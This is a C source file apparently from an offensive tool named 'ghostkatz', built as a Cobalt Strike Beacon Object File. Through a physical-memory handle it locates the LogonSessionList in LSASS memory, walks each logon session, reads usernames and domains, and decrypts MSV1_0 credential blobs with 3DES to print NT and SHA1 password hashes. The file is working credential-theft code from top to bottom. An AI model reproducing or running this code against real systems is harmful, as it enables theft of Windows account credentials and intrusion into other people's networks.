#include <windows.h>
#include <ntstatus.h>

#include "ghostkatz.h"
#include "defs.h"

BOOL IsEntryValid(HANDLE hFile, DWORD64 PAtoRead, DWORD lower32bits, int LsassPID, DWORD64 ImageStartAddress, DWORD64* FirstEntryInList)
{
    // Check if right side is valid
    DWORD64 FlinkVA = ReadAddressAtPhysicalAddressLocation(hFile, PAtoRead);
    if (FlinkVA > 0 && FlinkVA < ImageStartAddress)
    {
        DWORD64 tmpPA = 0;
        if (TranslateUVA2Physical(FlinkVA, &tmpPA, lower32bits, LsassPID))
        {
            // Check Right Side is Valid
            DWORD64 BlinkVA = ReadAddressAtPhysicalAddressLocation(hFile, PAtoRead + 0x8);
            if (BlinkVA > 0 && BlinkVA < ImageStartAddress)
            {
                tmpPA = 0;
                if (TranslateUVA2Physical(BlinkVA, &tmpPA, lower32bits, LsassPID))
                {
                    *FirstEntryInList = FlinkVA;
                    return TRUE;
                }
            }
        }
    }

    return FALSE;
}

DWORD64 IsValidLogonSessionListHead(HANDLE hFile, DWORD64 BasePagePAtoSearch, DWORD lower32bits, int LsassPID, DWORD64 ImageStartAddress)
{
    DWORD64 PAtoRead = BasePagePAtoSearch;
    while (PAtoRead < (BasePagePAtoSearch + 0x1000 - 0x10))
    {
        DWORD64 FirstEntryInList = 0;
        if (IsEntryValid(hFile, PAtoRead, lower32bits, LsassPID, ImageStartAddress, &FirstEntryInList))
        {
            // Time to search for Primary String to see if LogonSessionList is valid:
            // .process /p /r ffffdb8aeee52140; db poi(poi(poi(lsasrv!LogonSessionList)+0x108)+0x10)+0x28

            // poi(lsasrv!LogonSessionList) = FirstEntryInList
            //VERBOSE_PRINT("\t-> Potential LogonSessionList was found at PA=0x%llx\n", PAtoRead);

            // poi(poi(lsasrv!LogonSessionList)+0x108)
            DWORD64 credentialsStructureVPointer = FirstEntryInList + 0x108;
            DWORD64 credentialsStructurePPointer = 0;
            if (TranslateUVA2Physical(credentialsStructureVPointer, &credentialsStructurePPointer, lower32bits, LsassPID))
            {
                DWORD64 credentialsStructureVA = ReadAddressAtPhysicalAddressLocation(hFile, credentialsStructurePPointer);
                //VERBOSE_PRINT("\t\t-> Potential PKIWI_MSV1_0_CREDENTIALS structure identified 0x%llx\n", credentialsStructureVPointer);

                // poi(poi(poi(lsasrv!LogonSessionList)+0x108)+0x10)
                DWORD64 credentialsStructurePA = 0;
                if (TranslateUVA2Physical(credentialsStructureVA, &credentialsStructurePA, lower32bits, LsassPID))
                {
                    DWORD64 primaryCredentialsStructureVA = ReadAddressAtPhysicalAddressLocation(hFile, credentialsStructurePA + 0x10);
                    //VERBOSE_PRINT("\t\t\t-> Potential PKIWI_MSV1_0_PRIMARY_CREDENTIALS structure identified 0x%llx\n", primaryCredentialsStructureVA);

                    DWORD64 primaryCredentialsStructurePA = 0;
                    if (TranslateUVA2Physical(primaryCredentialsStructureVA, &primaryCredentialsStructurePA, lower32bits, LsassPID))
                    {
                        // poi(poi(poi(lsasrv!LogonSessionList)+0x108)+0x10)+0x28
                        unsigned char* PrimaryStringCheck = ReadMultipleBytes(hFile, 8, primaryCredentialsStructurePA + 0x28, TRUE);
                        if (memcmp(PrimaryStringCheck, "Primary", 8) == 0)
                        {
                            DWORD64 PointerToLogonSessionList = 0;
                            TranslateP2V(PAtoRead, &PointerToLogonSessionList);
                            return PointerToLogonSessionList;
                        }
                    }
                }
            }

        }

        PAtoRead += 0x10;
    }
    return 0;
}

DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWORD lower32bits, DWORD LsassPID, DWORD64 ImageStartAddress)
{
    DWORD64 BasePageVA = DataSectionBase;

    // Check through the pages in .data section and look for potentially valid LIST_ENTRY structures
    DWORD64 LogonSessionListHead = 0;
    do
    {
        DWORD64 BasePagePA = 0;
        TranslateUVA2Physical(BasePageVA, &BasePagePA, lower32bits, LsassPID);

        LogonSessionListHead = IsValidLogonSessionListHead(hFile, BasePagePA, lower32bits, LsassPID, ImageStartAddress);

        BasePageVA += 0x1000;

    } while (LogonSessionListHead == 0 && BasePageVA < DataSectionBase + 0x10000);

    return LogonSessionListHead;
}

BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHead, DWORD lower32bits, DWORD LsassPID, unsigned char* Real3DesKey, int i3DesKeyLength, unsigned char* InitializationVector)
{
    DWORD64 tmpPA = 0;
    DWORD64 kMSV1_0_LIST_63 = 0;
    DWORD64 Flink = 0;
    int bytesWritten = 0;

    // Get the first Flink to start the traversal
    // poi(lsasrv!LogonSessionList)
    TranslateUVA2Physical(LogonSessionListHead, &tmpPA, lower32bits, LsassPID);
    Flink = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA);


    int i = 0;
    while (Flink != LogonSessionListHead) // Did a full circle back to the beginning of the linked list
    {
        DWORD64 FlinkPA = 0;
        if (!TranslateUVA2Physical(Flink, &FlinkPA, lower32bits, LsassPID))
        {
            break; // Invalid address, break out of loop
        }
        BeaconFormatPrintf(&outputbuffer, "[%04d] Flink Base Address  : 0x%llx\n", i, Flink);


        wchar_t* UserNameWideString = ReadUnicodeStringFromPhysical(hFile, FlinkPA + LSA_UNICODE_STRING_UserName, lower32bits, LsassPID);
        if (UserNameWideString == NULL || *UserNameWideString == L'\0')
            UserNameWideString = L"(null)";

        char UserNameString[MAX_PATH];
        bytesWritten = WideCharToMultiByte(CP_ACP, 0, UserNameWideString, -1, UserNameString, MAX_PATH, NULL, NULL);
        if (bytesWritten != 0)
        {
            BeaconFormatPrintf(&outputbuffer, "\t    * Username    : %s\n", UserNameString);
        }
        else
        {
            BeaconFormatPrintf(&outputbuffer, "\t    * Username    : (Failed to convert to MultiByte string)\n");
        }


        wchar_t* DomainNameWideString = ReadUnicodeStringFromPhysical(hFile, FlinkPA + LSA_UNICODE_STRING_Domain, lower32bits, LsassPID);
        if (DomainNameWideString == NULL || *DomainNameWideString == L'\0')
            DomainNameWideString = L"(null)";

        char DomainNameString[MAX_PATH];
        bytesWritten = WideCharToMultiByte(CP_ACP, 0, DomainNameWideString, -1, DomainNameString, MAX_PATH, NULL, NULL);
        if (bytesWritten != 0)
        {
            BeaconFormatPrintf(&outputbuffer, "\t    * Domain      : %s\n", DomainNameString);
        }
        else
        {
            BeaconFormatPrintf(&outputbuffer, "\t    * Domain      : (Failed to convert to MultiByte string)\n");
        }


        // TO DO:
        // printf(L"\t    * SID         : ");
        // DisplaySID(AddressToSid); // Address is db poi(poi(lsasrv!LogonSessionList) + 0xd0)
        // printf("\n");


        // Below is for getting the Crypto Blob
        // poi( poi(lsasrv!LogonSessionList) + 0x108)
        TranslateUVA2Physical(Flink + PKIWI_MSV1_0_CREDENTIALS_Credentials, &tmpPA, lower32bits, LsassPID);
        DWORD64 credentialsStruct = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA);
        if (credentialsStruct != 0)
        {
            // poi( poi( poi(lsasrv!LogonSessionList) + 0x108) + 0x10)
            if (TranslateUVA2Physical(credentialsStruct + PKIWI_MSV1_0_PRIMARY_CREDENTIALS_PrimaryCredentials, &tmpPA, lower32bits, LsassPID))
            {
                // db poi(poi(poi(lsasrv!LogonSessionList)+0x108)+0x10)+0x30
                DWORD64 primaryCredentialsStruct = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA);
                if (TranslateUVA2Physical(primaryCredentialsStruct + LSA_UNICODE_STRING_Credentials, &tmpPA, lower32bits, LsassPID))
                {
                    // The crypto blob is the MSV1_0_PRIMARY_CREDENTIAL_10_1607 struct here towards the bottom https://whoamianony.top/posts/sekurlsa-how-to-dump-user-login-credentials-from-msv1_0/#3-%E6%89%93%E5%8D%B0%E7%99%BB%E5%BD%95%E4%BC%9A%E8%AF%9D%E4%BF%A1%E6%81%AF
                    unsigned char* cryptoBlob = ReadMultipleBytes(hFile, Credentials_CryptoBlob_Length, tmpPA, TRUE);
                    
                    NTSTATUS status;
                    ULONG cbResult = 0;
                    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
                    BCRYPT_KEY_HANDLE hKey = NULL;
                    UCHAR* bOutput = malloc(Credentials_CryptoBlob_Length);

                    status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_3DES_ALGORITHM, NULL, 0);

                    status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, Real3DesKey, i3DesKeyLength, 0);
                    if (status == STATUS_SUCCESS)
                    {
                        status = BCryptDecrypt(hKey, cryptoBlob, Credentials_CryptoBlob_Length, 0, InitializationVector, 8, bOutput, Credentials_CryptoBlob_Length, &cbResult, 0);
                        if (status == STATUS_SUCCESS)
                        {
                            BeaconFormatPrintf(&outputbuffer, "\t    * NT Hash     : ");
                            for (int j = 0; j < cbResult; j++)
                            {
                                if (j >= 74 && j < 90) // 4A to 5A
                                {
                                    BeaconFormatPrintf(&outputbuffer, "%02x", bOutput[j]);
                                }
                            }
                            BeaconFormatPrintf(&outputbuffer, "\n");

                            BeaconFormatPrintf(&outputbuffer, "\t    * SHA1 Hash   : ");
                            for (int j = 0; j < cbResult; j++)
                            {
                                if (j >= 106 && j < 126) // 6A to 7E
                                {
                                    BeaconFormatPrintf(&outputbuffer, "%02x", bOutput[j]);
                                }
                            }
                            BeaconFormatPrintf(&outputbuffer, "\n");
                        }
                        else
                        {
                            BeaconFormatPrintf(&outputbuffer, "Error in BCryptOpenAlgorithmProvider: 0x%lx\n", status);
                        }
                    }
                    else 
                    {
                        BeaconFormatPrintf(&outputbuffer, "\t    * Crypto blob: ");
                        PrintHex(cryptoBlob, Credentials_CryptoBlob_Length);
                    }
                    status = BCryptCloseAlgorithmProvider(hAlgorithm, 0);
                    status = BCryptDestroyKey(hKey);
                    free(bOutput);
                }
            }
        }
        else
        {
            BeaconFormatPrintf(&outputbuffer, "\t    * NT Hash     : (null)\n");
            BeaconFormatPrintf(&outputbuffer, "\t    * SHA1 Hash   : (null)\n");
        }

        BeaconFormatPrintf(&outputbuffer, "\n");
        TranslateUVA2Physical(Flink, &tmpPA, lower32bits, LsassPID);
        Flink = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA);

        i++;
    }

    return TRUE;
}
